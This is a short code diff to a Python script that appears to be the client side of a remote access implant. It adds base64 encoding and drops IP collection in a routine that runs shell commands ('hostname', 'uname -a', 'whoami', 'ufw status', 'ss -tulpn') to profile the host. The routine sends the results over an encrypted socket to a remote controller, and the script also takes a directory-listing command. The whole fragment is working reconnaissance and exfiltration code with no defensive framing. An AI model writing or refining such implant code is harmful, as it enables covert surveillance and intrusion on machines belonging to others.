@@ -7,6 +7,7 @@ import os
 import platform
 import socket
 import ssl
+import base64
 import subprocess as sp
 import time
 
@@ -101,7 +102,6 @@ for i in range(1, TIMEOUT):
             # Get System Infos
             infos = {}
             infos["hostname"] = sp.getoutput("hostname")
-            infos["ip"] = socket.gethostbyname(socket.gethostname())
             infos["operating_system"] = sp.getoutput("uname -a")
             infos["user"] = sp.getoutput("whoami")
             infos["python_version"] = sp.getoutput("python3 -V")
@@ -109,7 +109,7 @@ for i in range(1, TIMEOUT):
             infos["firewall"] = sp.getoutput("ufw status")
             infos["sudo"] = sp.getoutput("sudo -V")
             infos["services"] = sp.getoutput("ss -tulpn")
-            s.send(encrypt(json.dumps(infos)))
+            s.send(encrypt(base64.b64encode(json.dumps(infos).encode())))
         elif option == "dir":
             try:
                 os.listdir(args)
